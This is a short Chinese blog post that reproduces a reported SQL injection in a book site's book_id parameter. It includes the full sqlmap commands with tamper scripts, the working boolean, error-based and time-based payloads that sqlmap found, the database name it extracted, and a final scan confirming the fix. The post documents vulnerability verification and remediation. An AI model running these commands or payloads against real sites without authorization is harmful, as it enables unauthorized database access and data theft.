---
layout: post
title: "sql注入工具使用复现"
keywords: ["bug"]
description: "sql注入工具使用复现"
category: "bug"
tags: ["bug"]
---


### 前言
最近收到一个这样的需求，http://m.xxx.com/books/areward参数book_id 存在 sql注入漏洞
```
http://m.xxxx.com/books/areward?book_id=1084/((6-4)*(2-1)-1)&amp;gift_id=1
```

### 漏洞语句
漏洞证明语句：
```
python3 sqlmap.py -u "http://m.xxx.com/books/areward?book_id=1&gift_id=1" -p book_id --level=5 --risk=3 --tamper=space2comment.py,between.py --current-db --random-agent --time-sec=10 --batch
```

限mysql
```
python3 sqlmap.py -u "http://m.xxx.com/books/areward?book_id=1&gift_id=1" -p book_id --dbms=mysql  --level=5 --risk=3 --tamper=space2comment.py,between.py --current-db --random-agent --time-sec=10 --batch
```


### 漏洞回显
```
GET parameter 'book_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1177 HTTP(s) requests:
---
Parameter: book_id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: book_id=-4682) OR 8331=8331 AND (2888=2888&gift_id=1

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: book_id=1) AND GTID_SUBSET(CONCAT(0x716a707671,(SELECT (ELT(2184=2184,1))),0x716b7a7a71),2184) AND (1394=1394&gift_id=1

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: book_id=1) AND 2591=BENCHMARK(10000000,MD5(0x4447726b)) AND (7656=7656&gift_id=1
---
[09:01:52] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[09:01:52] [INFO] the back-end DBMS is MySQL
web application technology: PHP, Nginx
back-end DBMS: MySQL >= 5.6
[09:01:52] [INFO] fetching current database
[09:01:52] [INFO] retrieved: 'book'
current database: 'book'
[09:01:52] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/m.xxx.com'
[09:01:52] [WARNING] your sqlmap version is outdated
```


### 修复后不可注入
```
[09:11:19] [WARNING] GET parameter 'book_id' does not seem to be injectable
[09:11:19] [CRITICAL] all tested parameters do not appear to be injectable
[09:11:19] [WARNING] your sqlmap version is outdated
```
